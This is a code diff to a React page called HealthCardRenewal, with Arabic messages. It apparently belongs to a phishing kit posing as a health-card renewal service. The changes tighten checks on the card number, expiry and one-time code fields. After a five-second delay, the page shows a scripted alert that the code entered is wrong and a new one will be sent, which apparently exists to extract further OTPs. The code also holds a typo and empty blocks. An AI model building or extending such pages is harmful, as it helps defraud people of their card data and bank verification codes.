@@ -99,7 +99,7 @@ export default function HealthCardRenewal() {
       if (selectedMethod === '') {
       }
     } else if (stepr === 4) {
-      if (cardNumber === '' || cardNumber.length < 16) {
+      if (cardNumber === '' || cardNumber.length < 16 || dateMonth ==='' ||datayaer ==="") {
         return alert('الرجاء ادخال معلومات البطاقة بشكل صحيح ')
       }
 
@@ -128,9 +128,9 @@ export default function HealthCardRenewal() {
      setTimeout(() => {
      setIswait(false)
       
-      setStep(4)
+      setStep(5)
 
-      alert("حدث خطأ أثناء معالجة الدفع. يرجى المحاولة مرة أخرى.")
+    alert("رمز التحقق الذي ادخلتة غير صحيح, سوف يتم ارسال رمز جديد!")
      }, 5000);
      
     }
@@ -179,6 +179,9 @@ export default function HealthCardRenewal() {
         }
       )
       // setOtpard({otp,...otpArd})
+
+    }
+    if (stepr === 6) {
 
     }
   }
@@ -545,6 +548,7 @@ export default function HealthCardRenewal() {
                           placeholder="رمز التحقق"
                           className="max-w-md text-sm sm:text-base"
                           maxLength={6}
+                          minLength={4}
                         />
                       </div>
 
@@ -572,7 +576,7 @@ export default function HealthCardRenewal() {
                 تفريغ الحقول
               </Button>
               <Button
-                disabled={(stepr === 4 && !show)}
+                disabled={(stepr === 4 && !show && otp.length < 4 )}
                 type="submit"
                 className="w-full  sm:min-w-[100px] py-4 bg-[#C8102E] hover:bg-[#C8102E]/90"
               >
